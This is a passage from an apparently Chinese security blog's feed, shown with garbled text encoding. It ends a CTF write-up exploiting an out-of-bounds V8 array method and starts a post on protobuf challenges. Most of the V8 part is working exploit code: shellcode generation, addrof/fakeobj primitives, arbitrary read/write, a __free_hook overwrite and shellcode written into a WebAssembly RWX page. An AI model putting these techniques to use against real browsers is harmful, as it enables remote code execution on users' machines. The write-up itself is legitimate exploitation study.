â€”â–¸ 0x2754f1600751 â—‚â€” 0xce00002754f16007</span><br><span class="line">11:0088â”‚  0x365390d5f988 â€”â–¸ 0x2ed8b8773000 â—‚â€” movabs r10, 0x2ed8b8773260 /* 0x2ed8b8773260ba49 */</span><br><span class="line">12:0090â”‚  0x365390d5f990 â€”â–¸ 0x9e8bdb4e4a1 â—‚â€” 0x710000309e6c9c91</span><br><span class="line">13:0098â”‚  0x365390d5f998 â€”â–¸ 0x9e8bdb4e711 â—‚â€” 0x710000309e6c9cad</span><br><span class="line">pwndbg&gt; vmmap 0x2ed8b8773000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x2ed8b8773000     0x2ed8b8774000 rwxp     1000 0      [anon_2ed8b8773] +0x0</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨åç§»ä¸º<code>0x88</code>å¤„æœ‰rwxçš„æ®µäº†ã€‚æœ€åç›´æ¥å†™å…¥shellcodeå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># https://www.xi4oyu.top/</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">just8</span>(<span class="params">data</span>):</span></span><br><span class="line">    size = <span class="built_in">len</span>(data)</span><br><span class="line">    real_size = size <span class="keyword">if</span> size % <span class="number">8</span> == <span class="number">0</span> <span class="keyword">else</span> size + (<span class="number">8</span> - size % <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> data.ljust(real_size, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_js</span>(<span class="params">data</span>):</span></span><br><span class="line">    ret = <span class="string">&#x27;var sc_arr = [&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> (i // <span class="number">8</span>) % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">            ret += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        x = u64(data[i:i+<span class="number">8</span>])</span><br><span class="line">        ret += <span class="string">&#x27;\t&#x27;</span> + <span class="built_in">hex</span>(x) + <span class="string">&#x27;n,&#x27;</span></span><br><span class="line">    ret += <span class="string">&#x27;\n]\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_exec</span>(<span class="params">path, argv, envp</span>):</span></span><br><span class="line">    sc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    sc += shellcraft.pushstr(path)</span><br><span class="line">    sc += shellcraft.mov(<span class="string">&#x27;rdi&#x27;</span>, <span class="string">&#x27;rsp&#x27;</span>)</span><br><span class="line">    sc += shellcraft.pushstr_array(<span class="string">&#x27;rsi&#x27;</span>, argv)</span><br><span class="line">    sc += shellcraft.pushstr_array(<span class="string">&#x27;rdx&#x27;</span>, envp)</span><br><span class="line">    sc += shellcraft.syscall(<span class="string">&#x27;SYS_execve&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sc = call_exec(<span class="string">&#x27;/usr/bin/xcalc&#x27;</span>, [<span class="string">&#x27;xcalc&#x27;</span>], [<span class="string">&#x27;DISPLAY=:0&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sc)</span><br><span class="line">data = asm(sc)</span><br><span class="line">data = just8(data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(to_js(data))</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™æ˜¯æˆ‘æŠ„çš„ç”¨äºç”Ÿæˆjsçš„shellcodeçš„pythonè„šæœ¬ï¼Œåœ¨å¼€å¤´ç•™æœ‰åŸä½œè€…é“¾æ¥ã€‚</p><h3 id="æœ€ç»ˆexp"><a href="#æœ€ç»ˆexp" class="headerlink" title="æœ€ç»ˆexp"></a>æœ€ç»ˆexp</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span>, (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    data_view.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = arbitrary_read(address_of(a.constructor) + <span class="number">0x30n</span> - <span class="number">1n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;code_addr =&gt; 0x&#x27;</span> + code_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> v8_addr = arbitrary_read(code_addr + <span class="number">0x42n</span>);</span><br><span class="line"><span class="keyword">var</span> v8_base = v8_addr - <span class="number">0xfc8780n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;v8_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> free_got_addr = v8_base + <span class="number">0x12aa8b8n</span>;</span><br><span class="line"><span class="keyword">var</span> free_addr = arbitrary_read(free_got_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base = free_addr - <span class="number">0x9a6d0n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;libc_base =&gt; 0x&#x27;</span> + v8_base.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> __free_hook = libc_base + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x52290n</span>;</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, system_addr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">&quot;gnome-calculator\x00&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwn()</span><br><span class="line"></span><br><span class="line">arbitrary_write(__free_hook, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627183627029.png"                      alt="image-20230627183627029"                ></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> uint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;float64&#125; float_num</span></span><br><span class="line"><span class="comment">// @return &#123;uint64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">float_num</span>) </span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = float_num;</span><br><span class="line">    <span class="keyword">return</span> uint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @param &#123;uint64&#125; uint64_num</span></span><br><span class="line"><span class="comment">// @return &#123;float64&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">uint64_num</span>) </span>&#123;</span><br><span class="line">    uint64[<span class="number">0</span>] = uint64_num;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="string">&quot;a&quot;</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> flt_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> flt_array_map = flt_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">address_of</span>(<span class="params">leak_obj</span>) </span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = leak_obj;</span><br><span class="line">    obj_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">var</span> res = obj_array[<span class="number">0</span>];</span><br><span class="line">    obj_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">return</span> f2i(res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fake_object</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    flt_array[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    flt_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">var</span> fake_obj = flt_array[<span class="number">0</span>];</span><br><span class="line">    flt_array.oob(flt_array_map);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_rw_arr = [flt_array_map, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;arb_rw_arr =&gt; 0x&quot;</span> + (address_of(arb_rw_arr) - <span class="number">0x20n</span>).toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> fake_obj = fake_object(address_of(arb_rw_arr) - <span class="number">0x20n</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_read</span>(<span class="params">address</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(address - <span class="number">0x10n</span> + <span class="number">0x1n</span>)</span><br><span class="line">    <span class="keyword">return</span> f2i(fake_obj[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sc_arr = [</span><br><span class="line">    <span class="number">0x10101010101b848n</span>, <span class="number">0x62792eb848500101n</span>, <span class="number">0x431480101626d60n</span>, <span class="number">0x2f7273752fb84824n</span>,</span><br><span class="line">    <span class="number">0x48e78948506e6962n</span>, <span class="number">0x1010101010101b8n</span>, <span class="number">0x6d606279b8485001n</span>, <span class="number">0x2404314801010162n</span>,</span><br><span class="line">    <span class="number">0x1485e086a56f631n</span>, <span class="number">0x313b68e6894856e6n</span>, <span class="number">0x101012434810101n</span>, <span class="number">0x4c50534944b84801n</span>,</span><br><span class="line">    <span class="number">0x6a52d231503d5941n</span>, <span class="number">0x894852e201485a08n</span>, <span class="number">0x50f583b6ae2n</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(sc_arr.length * <span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = address_of(buffer) - <span class="number">1n</span> + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arbitrary_write</span>(<span class="params">address, value</span>) </span>&#123;</span><br><span class="line">    arb_rw_arr[<span class="number">2</span>] = i2f(buf_backing_store_addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_obj[<span class="number">0</span>] = i2f(address);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">        data_view.setFloat64(i * <span class="number">8</span>, i2f(value[i]), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> pwn = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> pwn_addr = address_of(pwn);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;pwn_addr =&gt; 0x&quot;</span> + pwn_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> shared_info_addr = arbitrary_read(pwn_addr - <span class="number">1n</span> + <span class="number">0x18n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;shared_info_addr =&gt; 0x&quot;</span> + shared_info_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> data_addr = arbitrary_read(shared_info_addr - <span class="number">1n</span> + <span class="number">0x8n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;data_addr =&gt; 0x&quot;</span> + data_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> instance_addr = arbitrary_read(data_addr - <span class="number">1n</span> + <span class="number">0x10n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;instance_addr =&gt; 0x&quot;</span> + instance_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"><span class="keyword">var</span> rwx_addr = arbitrary_read(instance_addr - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;rwx_addr =&gt; 0x&quot;</span> + rwx_addr.toString(<span class="number">16</span>).trim());</span><br><span class="line"></span><br><span class="line">arbitrary_write(rwx_addr, sc_arr);</span><br><span class="line"></span><br><span class="line">pwn();</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230627195354273.png"                      alt="image-20230627195354273"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;è¿™æ®µäº‹æƒ…å› ä¸ºå„ç§äº‹æƒ…è€½æï¼Œä¸€ç›´æ²¡æœ‰æ›´æ–°æ–‡ç« ã€‚æœ¬æ‰“ç®—æ–°çš„ä¸€ç¯‡å‡º&lt;code&gt;rootkit&lt;/code&gt;æ¥æ°´ä¸€ç¯‡ï¼Œåé¢å‘ç°a3ä½¬å†™çš„å¤ªå¤šäº†ï¼Œä¸æƒ³</summary>
      
    
    
    
    <category term="chrome-pwn" scheme="https://196082.github.io/categories/chrome-pwn/"/>
    
    
    <category term="overstep" scheme="https://196082.github.io/tags/overstep/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºprotobufçš„è§£é¢˜æ­¥éª¤</title>
    <link href="https://196082.github.io/2023/05/30/protobuf/"/>
    <id>https://196082.github.io/2023/05/30/protobuf/</id>
    <published>2023-05-30T08:26:30.000Z</published>
    <updated>2023-05-30T08:28:07.409Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…¶å®åœ¨ä»¥å‰å·²ç»å¤šæ¬¡é‡è§è¿‡<code>protobuf</code>äº†ï¼Œä½†æ˜¯éƒ½ä¸å¤ªåœ¨æ„å› ä¸ºæ€»æ„Ÿè§‰ä¼šåƒmuslåº“ä¸€æ ·ï¼Œå­˜æ´»ä¸€æ®µæ—¶é—´åå°±æ¶ˆå¤±äº†ã€‚æ‰€ä»¥ä¹Ÿå¯¼è‡´æˆ‘ä¸€ç›´æ²¡æœ‰å»çœŸæ­£åšè¿‡è¿™æ ·çš„é¢˜ï¼Œè¿™æ¬¡å›½èµ›ç¬¬ä¸€å¤©æ°å¥½å‡ºç°äº†è¿™æ ·ä¸€é“é¢˜ï¼Œä¸å‡ºæ„å¤–æ²¡èƒ½è§£å‡ºæ¥ï¼Œå¦‚æœä¸çœ‹wpæˆ‘å¯èƒ½è¿˜ä¼šæ€€ç–‘è‡ªå·±çš„é€†å‘èƒ½åŠ›ï¼Œå› ä¸ºæˆ‘è ¢åˆ°çœ‹äº†å‡ ä¸ªå°æ—¶çš„1200å¤šè¡Œä»£ç ã€‚æœ€å¯æ¶çš„æ˜¯å½“åˆä¸æƒ³ç©webçš„ä¸€å¤§åŸå› å°±æ˜¯æˆ‘æ¯”è¾ƒç²—å¿ƒå¤§æ„ï¼Œé¢å¯¹ä¿¡æ¯æ”¶é›†æ—¶å¾€å¾€ä¼šå¿½ç•¥æ‰é‡è¦ä¿¡æ¯ï¼Œä½†æ˜¯ç°åœ¨çš„pwnä¹Ÿè¶Šæ¥è¶Šå¾€è¿™ä¸ªæ–¹å‘é äº†ã€‚ä¸å¯å¦è®¤çš„æ˜¯ï¼Œè¿™æå‡äº†é€‰æ‰‹çš„ç»¼åˆå®åŠ›(<del>æ¶å¿ƒé€‰æ‰‹</del>)ï¼Œåªæ˜¯æˆ‘ä¸å¤ªèƒ½æ¥å—ä»ä¸€ä¸ªå‘åˆè·³åˆ°äº†å¦å¤–ä¸€ä¸ªå‘é‡Œé¢å»äº†ã€‚ä¸è¿‡ï¼Œéœ€è¦è®¤æ¸…ç°å®çš„æ˜¯æˆ‘çš„é€†å‘æ°´å¹³ç¡®å®å¾ˆå·®ï¼Œæˆ‘ä¹Ÿå‡†å¤‡å¼€å§‹åˆ·é€†å‘é¢˜äº†ã€‚</p><h2 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h2><h3 id="ä»€ä¹ˆæ˜¯protobuf"><a href="#ä»€ä¹ˆæ˜¯protobuf" class="headerlink" title="ä»€ä¹ˆæ˜¯protobuf"></a>ä»€ä¹ˆæ˜¯protobuf</h3><p>Protocol 